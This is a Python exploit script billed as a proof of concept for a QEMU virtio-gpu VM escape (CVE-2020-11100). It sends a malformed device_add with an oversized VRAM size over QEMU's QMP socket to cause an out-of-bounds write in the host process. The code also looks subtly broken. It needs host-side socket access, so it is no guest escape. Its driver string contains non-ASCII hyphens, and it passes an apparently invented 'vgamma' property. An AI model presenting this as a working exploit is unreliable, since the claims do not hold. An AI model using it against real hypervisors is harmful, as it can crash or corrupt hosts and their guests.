#!/usr/bin/env python3
"""
PoC for QEMU virtio‐gpu VM escape (CVE‐2020‐11100)

Uses QMP to add a malicious virtio‐gpu device with
an oversize backing‐store command, causing an OOB
write in the QEMU process.
"""

import socket, json, time

QMP_SOCKET = "/tmp/qemu-qmp-sock"

def qmp_cmd(s, cmd: dict):
    data = json.dumps(cmd).encode() + b"\n"
    s.sendall(data)
    resp = s.recv(4096)
    return json.loads(resp.decode())

def main():
    # 1) Connect to QEMU’s QMP socket
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(QMP_SOCKET)
    print("[+] Connected to QEMU QMP")

    # 2) Negotiate capabilities
    qmp_cmd(s, {"execute": "qmp_capabilities"})
    print("[+] QMP capabilities negotiated")

    # 3) Construct a virtio‐gpu device_add with bad parameters
    cmd = {
        "execute": "device_add",
        "arguments": {
            "driver": "virtio‐gpu‐pci",
            "id": "badgpu",
            # Oversized VRAM size to induce OOB in host process
            "vram_size": 0xffffffff,
            "vgamma": 0
        }
    }
    resp = qmp_cmd(s, cmd)
    print("[+] Sent bad device_add:", resp)

    # Wait to observe crash or hang
    time.sleep(2)
    print("[!] Check QEMU process for OOB corruption")
    s.close()

if __name__ == "__main__":
    main()